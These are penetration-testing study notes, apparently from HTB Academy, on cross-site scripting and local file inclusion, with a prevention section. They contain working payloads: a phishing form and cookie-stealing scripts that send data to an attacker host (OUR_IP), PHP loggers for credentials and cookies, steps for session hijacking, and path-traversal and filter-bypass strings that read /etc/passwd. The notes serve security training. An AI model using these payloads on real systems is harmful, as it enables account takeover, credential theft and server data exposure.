Web Applications/Module 19

Cross-Site Scripting (XSS)

What is XSS?

Cross-Site Scripting (XSS) is a web vulnerability that occurs when a web application fails to properly sanitize user input, allowing an attacker to inject malicious JavaScript into pages viewed by other users.

The browser trusts content coming from the web server — so if an attacker can get their script stored in or reflected by that server, the victim's browser will execute it without question.

Key Concept: XSS is a client-side vulnerability. It does not directly compromise the server — it compromises the users visiting the vulnerable page.

What Can XSS Do?

Attack Vector Example
Cookie/Session Theft Steal session tokens to hijack accounts
Credential Harvesting Inject fake login forms (phishing)
Keylogging Record keystrokes in the browser
Defacement Change page content for all visitors
Malware Delivery Redirect users to malicious downloads
Bitcoin Mining Run crypto mining scripts in browser
Ad Injection Display attacker-controlled ads
Browser Exploitation Chain with browser 0-days for RCE

Browser Sandbox Note: XSS is limited to the browser's JavaScript engine (e.g., V8 in Chrome) and the same-origin domain. However, a skilled attacker can chain XSS with a browser binary vulnerability (e.g., heap overflow) to break out of the sandbox and execute code on the victim's machine.

XSS Risk Rating

XSS is rated Medium Risk using the standard risk matrix:

Low Impact + High Probability = Medium Risk
Factor Assessment
Impact Low–Medium (client-side only, no direct server compromise)
Probability High (found in almost all modern web apps)
Overall Risk Medium — must be detected, remediated, and prevented

Real-World Examples:
- Samy Worm (2005): Exploited stored XSS on MySpace. Within one day, over 1 million profiles were infected. Payload auto-posted a message and re-propagated to every viewer.
- Twitter TweetDeck (2014): Self-retweeting XSS caused a tweet to be retweeted 38,000+ times in under 2 minutes, forcing Twitter to temporarily shut down TweetDeck.
- Google Search (2019): XSS found in Google's XML library within their search bar.
- Apache Server: XSS actively exploited to steal user passwords.

Types of XSS

XSS
├── Stored (Persistent) XSS       ← Most Critical
├── Reflected (Non-Persistent) XSS
└── DOM-Based (Non-Persistent) XSS
Type Where Input is Processed Persistence Who is Affected
Stored Back-end database, then rendered ✅ Persistent All users who visit the page
Reflected Back-end server (in HTTP response) ❌ Non-persistent Only the targeted user
DOM-Based Client-side JavaScript only ❌ Non-persistent Only the targeted user

Stored XSS (Persistent)

How It Works

  1. Attacker submits a malicious payload (e.g., in a comment or form field)
  2. The server stores it in the database without sanitization
  3. Every time another user loads the page, the server retrieves the payload and renders it in the HTML
  4. The victim's browser executes the script

Why it's the most critical: The attack persists and affects every user who visits the page — not just the attacker's session. Removal requires cleaning the database.

Testing for Stored XSS

Step 1 — Identify an input field that displays output back to users:

Look for: comment sections, to-do lists, user profiles, forum posts, product reviews — anywhere user input is stored and shown to others.

Step 2 — Submit a basic test payload:

<script>alert(window.origin)</script>

Why window.origin instead of a static value like 1?
Many modern web apps use cross-domain iFrames to handle user input. By printing window.origin, we can see which domain actually executed the script — confirming the exact vulnerable form/iframe, not just that JS ran somewhere.

🔍 What to look for
- An alert box pops up immediately after submission → XSS exists
- The alert shows the page URL (from window.origin) → confirms execution context

Step 3 — Verify persistence:

Refresh the page. If the alert fires again, the XSS is stored/persistent. This means any user who visits the page will also trigger it.

Step 4 — Confirm in page source:

Press CTRL+U to view source. Look for your payload embedded in the HTML:

<ul id="todo">
  <script>alert(window.origin)</script>
</ul>

Alternative Payloads (When alert() is Blocked)

Some modern browsers block alert() in certain contexts (e.g., cross-origin iFrames). Use these instead:

<plaintext>

Stops HTML rendering after this point — everything after it appears as raw text. Very easy to spot visually.

<script>print()</script>

Opens the browser's print dialog. Unlikely to be blocked by any browser. A clear proof of execution.

Reflected XSS (Non-Persistent)

How It Works

  1. Attacker crafts a URL containing a malicious payload in a query parameter
  2. The victim clicks the link (or is redirected)
  3. The server processes the parameter and reflects it back in the HTTP response (e.g., in an error message)
  4. The victim's browser executes the script
  5. After the user leaves the page or reloads without the payload URL, nothing runs again

Key Difference from Stored: The payload is never stored. It only executes when the victim visits the specific crafted URL.

How to Target Victims

Since the payload travels in the URL, you need to send the victim a specially crafted link.

Step 1 — Test the input field:

Submit a test value (e.g., "test") and observe if it appears in the page response — for example, in an error message: Task 'test' could not be added.

Step 2 — Inject XSS payload:

<script>alert(window.origin)</script>

Submit it. If an alert fires, the page is vulnerable. The error message may read Task '' could not be added. because the <script> tags aren't rendered visually — but the JS executes.

Step 3 — Determine the HTTP method:

Open Firefox DevTools → Network tab (CTRL+I). Submit the payload and observe:

  • If the request is GET → the payload is in the URL → you can copy and share the full URL with the victim
  • If the request is POST → you need a different delivery mechanism (e.g., a crafted HTML page that auto-submits the form)

Step 4 — Extract and share the URL:

Right-click the GET request in the Network tab → Copy > Copy URL

Send this URL to the victim. When they open it, the XSS fires in their browser.

Step 5 — Confirm non-persistence:

Navigate away and revisit the base page (without your payload in the URL) — the alert should NOT fire. This confirms it's reflected, not stored.

DOM-Based XSS

How It Works

  1. The page uses client-side JavaScript to read a URL parameter and write it directly to the DOM
  2. No HTTP request goes to the server for processing the user input
  3. The browser processes and renders the malicious input entirely on the client side

Key Difference from Reflected: The payload never reaches the server. The server response is the same regardless of input — the danger is in how client-side JS handles the URL.

How to Identify DOM XSS

Step 1 — Check Network Activity:

Open DevTools → Network tab. Add a test item. If no HTTP request is made, and the input still appears on the page, it's DOM-based.

Step 2 — Look at the URL:

DOM XSS often uses a # (hash/fragment) in the URL: index.html#task=myinput
The fragment is never sent to the server — it's purely client-side.

Step 3 — View Rendered Page Source:

The regular CTRL+U page source won't show DOM-injected content (it only shows what the server sent).
Use CTRL+SHIFT+C (Web Inspector) to see the live, rendered DOM with injected content.

Step 4 — Read the JavaScript Source Code:

Look for the Source (where input comes from) and the Sink (where it gets written to the DOM).

Example vulnerable code in script.js:

// SOURCE — reads user input from URL parameter
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);

// SINK — writes it directly to DOM without sanitization
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);

The innerHTML sink writes raw HTML — perfect for XSS injection.

Common Sinks (Dangerous Functions)

JavaScript:

Function Risk
document.write() Writes raw HTML to document
DOM.innerHTML Sets raw HTML content of element
DOM.outerHTML Replaces element with raw HTML

jQuery:

Function Risk
add() Adds elements
after() Inserts HTML after element
append() Appends HTML to element

DOM XSS Payload

Regular <script> tags don't work with innerHTML (browser blocks them as a security measure).

Use an image-based payload instead:

<img src="" onerror=alert(window.origin)>

Why this works:
- Creates an <img> element with an intentionally empty src=""
- Since the image doesn't exist, the browser fires the onerror event
- The onerror handler executes arbitrary JavaScript
- No <script> tags required — bypasses the innerHTML restriction

XSS Discovery

Automated Discovery

Web Application Vulnerability Scanners detect XSS in two modes:

Scan Mode How It Works
Passive Scan Reviews client-side code for potential DOM-based vulnerabilities without sending payloads
Active Scan Injects various payloads and checks if they appear in the rendered response

Paid tools (Nessus, Burp Pro, ZAP Pro) have higher accuracy, especially with security bypass techniques.

Open-Source XSS Tools:

XSStrike

A powerful, intelligent XSS scanner that analyzes reflections and generates context-aware payloads.

GitHub: https://github.com/s0md3v/XSStrike

Installation:

git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py

Usage — test a URL parameter:

python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"

Why this command?
- -u specifies the target URL with the parameter to test
- XSStrike automatically detects the parameter, identifies reflections, generates context-aware payloads, and tests them
- Output shows the payload, efficiency score, and confidence level

What to look for in results:

[~] Checking for DOM vulnerabilities
[+] WAF Status: Offline
[!] Testing parameter: task
[!] Reflections found: 1
[~] Analysing reflections
[~] Generating payloads
[!] Payloads generated: 3072
[+] Payload: <HtMl%09onPoIntERENTER+=+confirm()>
[!] Efficiency: 100
[!] Confidence: 10
  • Reflections found: 1 → input appears in the response (potential XSS)
  • WAF Status: Offline → no WAF filtering
  • Efficiency: 100 → payload successfully executed
  • Next step: Manually verify the payload in the browser

Other Open-Source Tools:
- Brute XSS: https://github.com/rajeshmajumdar/BruteXSS
- XSSer: https://github.com/epsylon/xsser

Manual Discovery

Method 1 — Payload List Testing:

Resources for XSS payload lists:
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
- PayloadBox: https://github.com/payloadbox/xss-payload-list

Test each payload in every input field. Note: Most generic payloads won't work with basic vulnerabilities since they target specific injection contexts (after quotes, in attributes, etc.).

Pro Tip: XSS can be injected into any input, not just form fields. Test HTTP headers too: User-Agent, Referer, Cookie — especially if their values are reflected on the page.

Method 2 — Custom Python Script:

Automate payload sending and compare page source responses. Useful for apps where manual testing of many fields is impractical.

Method 3 — Code Review (Most Reliable):

Review both front-end and back-end source code:

  • Front-end: Look for dangerous sinks (innerHTML, document.write, jQuery methods)
  • Back-end: Look for unsanitized user input being returned in responses
  • Trace data flow from input (Source) → output (Sink)

Reference: Secure Coding 101: JavaScript and Whitebox Pentesting 101: Command Injection

XSS Exploitation — Defacing

Defacing uses stored XSS to change the appearance of a website for all visitors.

Payload 1 — Change Background Color

<script>document.body.style.background = "#141d2b"</script>

Why: Sets the page background to a dark color (HTB's color). Uses document.body.style.background to apply inline CSS.
What next: Inject into a stored XSS input. Every page visit will now show the dark background.

Payload 2 — Change Background to Image

<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>

Why: Sets an image URL as the page background instead of a color.

Payload 3 — Change Page Title

<script>document.title = 'HackTheBox Academy'</script>

Why: Changes the browser tab title. Visible immediately in the page tab/window title bar.

Payload 4 — Overwrite Page Body Content

document.getElementById("todo").innerHTML = "New Text"

Why: Replaces the inner HTML of a specific element by its id. Good for targeted replacement.

$("#todo").html('New Text');

Why: jQuery equivalent — shorter syntax, achieves the same result. Requires jQuery to be loaded on the page.

document.getElementsByTagName('body')[0].innerHTML = "New Text"

Why: Replaces the entire page body. getElementsByTagName('body') returns all body elements; [0] selects the first one.

Full Defacement Payload (Combined)

<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>

Tip: Test your HTML code locally first to verify it renders correctly before injecting it as a final payload.

Complete 3-payload defacement sequence:

// Inject all three as separate stored XSS entries:

// 1. Change background
<script>document.body.style.background = "#141d2b"</script>

// 2. Change title
<script>document.title = 'HackTheBox Academy'</script>

// 3. Replace body content
<script>document.getElementsByTagName('body')[0].innerHTML = '...your HTML...'</script>

XSS Exploitation — Phishing

Goal

Inject a fake login form into a vulnerable page that sends captured credentials to the attacker's server.

Step 1 — Find a Working XSS Payload

Test input fields. For each field, view the page source to understand how input is rendered in HTML, then craft the right payload.

Step 2 — Build the Login Form HTML

<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>

Replace OUR_IP with your attacker machine's IP (find it with ip a under the tun0 interface when connected to HTB VPN).

Step 3 — Inject via XSS Using document.write()

document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');

Why document.write()?
It writes raw HTML directly into the page at the point of execution — effectively inserting our fake form into the DOM without needing a separate file.

Step 4 — Remove the Original Input Field

After injecting the form, the original field may still be visible (breaking the illusion). Remove it:

Find the element ID using Inspector Picker (CTRL+SHIFT+C), then click the element. Example: the URL form has id='urlform'.

document.getElementById('urlform').remove();

Final combined payload:

document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();

Step 5 — Clean Up Remaining HTML

Any HTML code after your injection may still appear on the page. Comment it out:

...PAYLOAD... <!--

Adding <!-- at the end comments out all subsequent HTML in the source.

Step 6 — Capture Credentials

Option A — Basic Netcat Listener:

sudo nc -lvnp 80

Flag breakdown:
- nc — netcat, a raw TCP/UDP listener
- -l — listen mode
- -v — verbose output
- -n — no DNS resolution (faster)
- -p 80 — listen on port 80 (HTTP, same port the form POSTs to)

What you receive: A raw HTTP GET request like:

GET /?username=test&password=test&submit=Login HTTP/1.1

⚠️ Problem: The victim gets an "Unable to connect" error after submitting. This may raise suspicion.

Option B — PHP Server with Credential Logger (Stealthier):

mkdir /tmp/tmpserver
cd /tmp/tmpserver

Create index.php:

<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>

Why this is better:
- Logs credentials to creds.txt
- Redirects the victim back to the real page → they think they successfully logged in
- No suspicious error page

sudo php -S 0.0.0.0:80

Flag breakdown:
- php -S — starts PHP's built-in development web server
- 0.0.0.0 — listen on all network interfaces
- :80 — on port 80

Check captured credentials:

cat creds.txt
# Output: Username: victim | Password: secretpass

XSS Exploitation — Session Hijacking

Concept

Web apps use cookies to maintain user sessions. If you steal a victim's session cookie, you can authenticate as them without knowing their password — this is called Cookie Stealing or Session Hijacking.

Blind XSS

A Blind XSS vulnerability occurs when the injection point is on a page you don't have direct access to (e.g., an admin panel that reviews user submissions).

Common blind XSS contexts:
- Contact forms
- User registration forms (reviewed by admins)
- Support tickets
- Product reviews
- HTTP headers (User-Agent, Referer, etc.)

The problem with Blind XSS:
1. You can't see if your payload executed (no visible alert)
2. You don't know which field is vulnerable

The solution: Use a payload that makes an outbound HTTP request to your server. If you get a hit, the payload executed.

Step 1 — Set Up Your Listener/Server

mkdir /tmp/tmpserver
cd /tmp/tmpserver
sudo php -S 0.0.0.0:80

Step 2 — Identify the Vulnerable Field (Remote Script Loading)

For each input field, inject a payload that loads a uniquely-named script from your server. The script name = field name, so you know which field fired.

<script src="http://OUR_IP/fullname"></script>
<script src="http://OUR_IP/username"></script>
<script src="http://OUR_IP/email"></script>

Why this works: If the fullname field is vulnerable and an admin views it, their browser will request http://OUR_IP/fullname — you'll see this hit in your PHP server logs, identifying the vulnerable field.

Skip the email field (usually validated for email format on front-end AND back-end). Skip the password field (usually hashed, not displayed).

Various payload formats to try (from PayloadsAllTheThings):

<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>

Try the different formats because the correct one depends on how your input is reflected in HTML (inside quotes, after a >, etc.).

Step 3 — Create the Cookie-Stealing Script

Once you've identified the vulnerable field and a working payload, host a JavaScript file (script.js) on your server:

new Image().src='http://OUR_IP/index.php?c='+document.cookie

Why this approach:
- Creates an invisible Image object
- Sets its src to your server URL with the cookie appended as a query parameter
- The browser automatically makes an HTTP request to load the "image"
- You receive the victim's cookies in the request

Alternative (more obvious to blue team):

document.location='http://OUR_IP/index.php?c='+document.cookie;

This redirects the victim's browser to your server — very noticeable.

Step 4 — Create the Cookie Logger (PHP)

Create index.php in /tmp/tmpserver/:

<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>

Why this script:
- $_GET['c'] captures the cookie string from the URL
- explode(";", ...) splits multiple cookies (a single cookie header can have multiple key=value pairs separated by ;)
- urldecode() decodes URL-encoded characters
- Logs victim IP + cookie to cookies.txt
- Multiple victims each get their own entry

Step 5 — Inject the Payload

In the vulnerable field, inject:

<script src=http://OUR_IP/script.js></script>

Submit the form. When an admin reviews it, their browser fetches script.js from your server, executes it, and sends their cookies to your index.php.

Step 6 — Retrieve and Use the Stolen Cookie

Check the logs:

cat cookies.txt
# Output: Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2

Use the cookie in Firefox:

  1. Navigate to the target site's login page (e.g., /hijacking/login.php)
  2. Press Shift+F9 to open the Storage Inspector
  3. Click the + button to add a new cookie
  4. Set Name = the part before = (e.g., cookie)
  5. Set Value = the part after = (e.g., f904f93c949d19d870911bf8b05fe7b2)
  6. Refresh the page → you're now authenticated as the victim

XSS Prevention

Front-End Protection

1. Input Validation (JavaScript)

Validate format before accepting input. Example — email validation regex:

function validateEmail(email) {
    const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test($("#login input[name=email]").val());
}

⚠️ Front-end validation alone is insufficient — attackers can bypass it by sending crafted HTTP requests directly. Always validate on the back-end too.

2. Input Sanitization (DOMPurify)

DOMPurify is a JavaScript library that sanitizes HTML and prevents XSS by stripping dangerous content.

<script type="text/javascript" src="dist/purify.min.js"></script>

let clean = DOMPurify.sanitize(dirty);

Why: Escapes special characters and strips dangerous HTML (like <script> tags) — essential for preventing DOM XSS.

3. Avoid Dangerous Patterns

Never insert user input directly into:

<!-- DANGEROUS: Direct script injection -->
<script>USER_INPUT</script>

<!-- DANGEROUS: Direct CSS injection -->
<style>USER_INPUT</style>

<!-- DANGEROUS: In HTML attributes -->
<div name='USER_INPUT'></div>

<!-- DANGEROUS: In HTML comments -->
<!-- USER_INPUT -->

Avoid these JavaScript functions with user input:

// Dangerous JS functions
DOM.innerHTML = userInput;        // ❌
DOM.outerHTML = userInput;        // ❌
document.write(userInput);        // ❌
document.writeln(userInput);      // ❌
document.domain = userInput;      // ❌

// Dangerous jQuery functions
$(element).html(userInput);       // ❌
$(element).parseHTML(userInput);  // ❌
$(element).add(userInput);        // ❌
$(element).append(userInput);     // ❌
$(element).prepend(userInput);    // ❌
$(element).after(userInput);      // ❌
$(element).insertAfter(userInput);// ❌
$(element).before(userInput);     // ❌
$(element).insertBefore(userInput);// ❌
$(element).replaceAll(userInput); // ❌
$(element).replaceWith(userInput);// ❌

Back-End Protection

1. Input Validation (PHP)

if (filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)) {
    // Input is valid — process it
} else {
    // Reject input — do NOT display it back to the user
}

2. Input Sanitization (PHP)

addslashes($_GET['email'])

Escapes special characters with backslashes. Prevents raw injection of quotes and script tags.

NodeJS equivalent — using DOMPurify server-side:

import DOMPurify from 'dompurify';
var clean = DOMPurify.sanitize(dirty);

3. Output HTML Encoding (PHP)

Never display raw user input. Always encode it for safe rendering:

htmlentities($_GET['email']);
// or
htmlspecialchars($_GET['email']);

What this does: Converts < to &lt;, > to &gt;, etc. The browser displays the characters correctly but won't execute them as HTML/JavaScript.

NodeJS equivalent:

import encode from 'html-entities';
encode('<'); // → '&lt;'

4. Server Configuration

Configuration Purpose
Use HTTPS across the entire domain Prevents cookie theft via MITM
X-XSS-Protection header Enables browser's built-in XSS filter (legacy)
X-Content-Type-Options: nosniff Prevents MIME type sniffing
Content-Security-Policy: script-src 'self' Only allows scripts from your own domain
HttpOnly cookie flag Prevents JavaScript from reading cookies
Secure cookie flag Cookies only sent over HTTPS

WAF (Web Application Firewall): A good WAF automatically detects and blocks XSS payloads in HTTP requests. Combined with the above, it significantly reduces risk.

Framework protections: Some frameworks like ASP.NET have built-in XSS protection.

Tools Reference

Netcat (nc)

A networking utility for creating TCP/UDP connections — used here as a raw HTTP listener to capture credential submissions.

sudo nc -lvnp 80
Flag Meaning
-l Listen mode (wait for incoming connections)
-v Verbose — show connection details
-n Numeric only — skip DNS lookups (faster)
-p 80 Port to listen on
⚡ When to use Quick verification that a form is submitting to your IP. Not ideal for production use (doesn't handle the HTTP response cleanly).

PHP Built-in Server

PHP's built-in development server — used to serve index.php and script.js to victims.

sudo php -S 0.0.0.0:80
Part Meaning
php -S Start built-in web server
0.0.0.0 Listen on all interfaces (accessible from VPN)
:80 On port 80 (HTTP)
⚡ When to use When you need a proper HTTP server that responds correctly to requests — e.g., serving script.js and logging cookies. Much better UX for victims than a raw netcat listener.

XSStrike

An intelligent XSS scanner that identifies reflections, generates context-aware payloads, and tests bypass techniques.

GitHub: https://github.com/s0md3v/XSStrike

# Install
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt

# Run against a URL parameter
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"

What it does:
1. Checks for DOM vulnerabilities
2. Detects WAF presence
3. Analyzes how input is reflected in the response
4. Generates thousands of context-aware payloads
5. Reports which payloads worked with efficiency/confidence scores

🧠 Key Takeaways

Stored XSS → Payload in DB → Affects ALL users → Most critical
Reflected XSS → Payload in URL → Sent to victim via link → Non-persistent
DOM XSS → Payload processed client-side → Never hits server → Use <img onerror=...> instead of <script>

Finding XSS: Source (user input) → Sink (DOM output) → If no sanitization between them = vulnerable

Session Hijacking Flow: Find blind XSS → Identify field via callback → Host script.js → Inject → Receive cookie → Authenticate as victim

Prevention: Validate + Sanitize on BOTH front-end AND back-end. Encode output. Use CSP headers. Set HttpOnly + Secure cookie flags.

Web Applications/Module 20

File Inclusion

What is File Inclusion?

File inclusion vulnerabilities occur when user-controlled input is passed into a file-loading function without proper sanitization. This allows an attacker to manipulate which file is loaded and displayed by the application.

Why Does This Happen?

Modern web apps use templating engines to keep shared elements (headers, footers, navbars) consistent across pages. Instead of duplicating HTML, they dynamically include files based on a parameter:

/index.php?page=about
/index.php?language=es

The server takes the parameter value and loads a corresponding file. If that value is not sanitized, an attacker can substitute their own path.

What Can an Attacker Do?

Impact Description
Source Code Disclosure Read PHP/config files to find hardcoded credentials, logic flaws
Sensitive Data Exposure Read /etc/passwd, SSH keys, database configs
Remote Code Execution Under certain conditions, execute arbitrary commands on the server
Full Server Compromise Chain LFI with other vulnerabilities to own the box

Vulnerable Code Examples by Language

PHP

if (isset($_GET['language'])) {
    include($_GET['language']);
}

Why it's vulnerable: The language GET parameter is passed directly into include() with no validation. Any file path — including system files — will be loaded and potentially executed.

Other vulnerable PHP functions:
- include() / include_once()
- require() / require_once()
- file_get_contents()
- fopen() / file()

NodeJS

if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}

Why it's vulnerable: The language query parameter is appended to the app's base directory and passed to fs.readFile(). An attacker can traverse out of the intended directory.

Express.js variant (URL path parameter):

app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});

Here the parameter comes from the URL path (e.g. /about/en) instead of a query string. The render() function directly uses it — equally vulnerable.

Java

<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>

<c:import url="<%= request.getParameter('language') %>"/>

Why it's vulnerable: Both jsp:include and c:import use the language request parameter directly. c:import is especially dangerous as it also supports remote URLs.

.NET

@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %>
}

@Html.Partial(HttpContext.Request.Query['language'])

<!--#include file="<% HttpContext.Request.Query['language'] %>"-->

Why it's vulnerable: All three methods pass the language parameter directly into file-reading/rendering functions without sanitization.

Read vs Execute — Function Reference Table

⚠️ Critical distinction: Functions that Execute allow you to achieve RCE if you can control the included file. Functions that only Read limit you to source disclosure.

Function Read Content Execute Remote URL
PHP
include() / include_once() ✅ ✅ ✅
require() / require_once() ✅ ✅ ❌
file_get_contents() ✅ ❌ ✅
fopen() / file() ✅ ❌ ❌
NodeJS
fs.readFile() ✅ ❌ ❌
fs.sendFile() ✅ ❌ ❌
res.render() ✅ ✅ ❌
Java
include ✅ ❌ ❌
import ✅ ✅ ✅
.NET
@Html.Partial() ✅ ❌ ❌
@Html.RemotePartial() ✅ ❌ ✅
Response.WriteFile() ✅ ❌ ❌
include ✅ ✅ ✅

Local File Inclusion (LFI)

LFI lets you read (and sometimes execute) files that exist locally on the server.

Basic LFI

Scenario: The app uses a parameter like ?language=es.php to load content. If the full path is passed directly to include():

include($_GET['language']);

Payload:

/index.php?language=/etc/passwd

What you're doing: Substituting the intended value (es.php) with an absolute path to a sensitive file (/etc/passwd).

➜ What you get The contents of /etc/passwd — a list of all users on the Linux system. This confirms LFI and gives you usernames for further attacks (e.g., password spraying).

Windows equivalent: C:\Windows\boot.ini

Path Traversal

Scenario: The app prepends a directory to your input:

include("./languages/" . $_GET['language']);

Trying /etc/passwd now becomes ./languages//etc/passwd — which doesn't exist.

Fix: Use ../ (parent directory traversal) to climb out:

/index.php?language=../../../../etc/passwd

What you're doing: Each ../ moves one level up from the current directory. Starting from /var/www/html/languages/, four ../ sequences bring you to /. Then /etc/passwd is appended.

Key insight: If you go past root (/), you stay at root — so using more ../ than needed is safe and common practice.

# From /var/www/html/ — 3 directories deep:
../../../../etc/passwd
# The 4th ../ lands at / and stays there

Tip: Find the minimum number of ../ that works. If you know the app lives at /var/www/html/, that's 3 directories deep, so ../../../ is sufficient.

Filename Prefix

Scenario: The code adds a prefix to your input:

include("lang_" . $_GET['language']);

Trying ../../../etc/passwd becomes lang_../../../etc/passwd — invalid.

Bypass: Prefix your payload with / to force the prefix to be treated as a directory name:

/index.php?language=/../../../etc/passwd

What you're doing: The / before .. makes PHP interpret lang_/ as the "directory" portion, then traversal proceeds normally.

Caveat: This doesn't always work if lang_/ doesn't exist as a directory. Prefixes can also break PHP wrappers and RFI attacks discussed later.

Appended Extensions

Scenario: The code appends a file extension:

include($_GET['language'] . ".php");

Trying /etc/passwd becomes /etc/passwd.php — doesn't exist.

Note: On modern PHP (5.3+), this is difficult to bypass. The techniques below are legacy/obsolete but may work on older servers.

Legacy Bypass 1 — Path Truncation (PHP < 5.3):

PHP strings were limited to 4096 characters. By making the path very long, the appended .php gets truncated:

# Generate a payload that's just over 4096 characters:
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done

/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]

What you're doing: Filling up the string buffer so that .php at the end gets cut off. The ./ sequences are ignored by Linux (they mean "current directory") so the path still resolves correctly.

Legacy Bypass 2 — Null Byte (PHP < 5.5):

/index.php?language=../../../../etc/passwd%00

What you're doing: %00 is a URL-encoded null byte. In C-based string handling (which PHP used internally), a null byte terminates the string. So include() sees /etc/passwd and ignores the .php suffix.

Why it's obsolete: Fixed in PHP 5.3.4+.

Second-Order Attacks

A more subtle LFI variant where the malicious payload is stored first, then triggered later by a different part of the app.

Example scenario:
1. App lets you set a username like ../../../etc/passwd
2. App stores this username in a database
3. Another feature (e.g., "download your avatar") loads /profile/$username/avatar.png
4. The stored path traversal payload is now executed server-side

Why it's dangerous: Developers often sanitize direct input (GET/POST parameters) but trust database values — assuming they were already validated at input time.

How to find it: Look for any feature that loads a file based on a value stored in a profile, setting, or database field that you control.

Basic Bypasses

When the app has filters, you need to work around them.

Non-Recursive Path Traversal Filters

The filter:

$language = str_replace('../', '', $_GET['language']);

This removes ../ from input — but only once, non-recursively.

Bypass — Nested traversal strings:

/index.php?language=....//....//....//....//etc/passwd

Why it works: str_replace removes ../ from ....//, leaving ../ behind. The outer dots and the extra slash reconstruct the traversal sequence after filtering.

....// → strip ../ → ../ ✅

Other variants that bypass non-recursive filters:

..././
....\/
..../////

URL Encoding Bypass

Scenario: The app blocks . or / characters in input.

Bypass: URL-encode the entire traversal string so the characters are not recognized as dots/slashes by the filter, but are decoded back by the server when passed to the file function.

../  →  %2e%2e%2f

Full payload:

/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64

Tool to generate this: Use Burp Suite Decoder (Encode as → URL) or any online URL encoder.

Important: Encode all characters including the dots. Some encoders skip dots since they're normally valid in URLs.

Double encoding: You can also double-encode (%252e%252e%252f) to bypass filters that only decode once.

Approved Paths Bypass

Scenario: The app uses a regex to enforce the file must come from a specific directory:

if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}

Bypass: Start your payload with the approved path prefix, then traverse out:

/index.php?language=./languages/../../../../etc/passwd

What you're doing: The regex check passes because the string starts with ./languages/. Then the traversal sequences take you out of that directory to wherever you want.

Combine with other bypasses: If the app also strips ../, combine this with the URL encoding or nested traversal bypass:
./languages/....//....//....//etc/passwd

Appended Extension Bypasses (Legacy)

See Appended Extensions above for Path Truncation and Null Byte techniques.

Modern reality: These don't work on PHP 5.3.4+ in most cases. With modern PHP, if an extension is appended, you're largely restricted to reading files with that extension — but PHP filters (next section) can still extract source code.

PHP Filters — Source Code Disclosure

PHP wrappers provide access to I/O streams at the application level. The php://filter wrapper lets you apply transformations to a file before it's included — including base64 encoding, which prevents PHP from executing the code and instead returns it as a readable string.

Wrapper syntax:

php://filter/read=<FILTER>/resource=<FILE>

Fuzzing for PHP Files

Before reading source code, discover what PHP files exist:

ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
  -u http://<SERVER_IP>:<PORT>/FUZZ.php

Tool: ffuf — a fast web fuzzer.

What you're doing: Appending .php to each wordlist entry and checking which paths return a response.

Important tip: Don't filter by status code 200 only. Since you have LFI access, 301, 302, and 403 responses also indicate a file exists that you can read. Use -mc all or include those codes.

🔍 What to look for Files like config.php, db.php, admin.php — these often contain credentials, database connection strings, and application secrets.
➜ Next step Once you find a file, use the base64 filter to read its contents.

Base64 Filter to Read Source Code

Standard inclusion problem: When you include a PHP file via LFI, it executes rather than displaying its source. You get rendered output (or blank), not the code.

Solution — Base64 encode the file before inclusion:

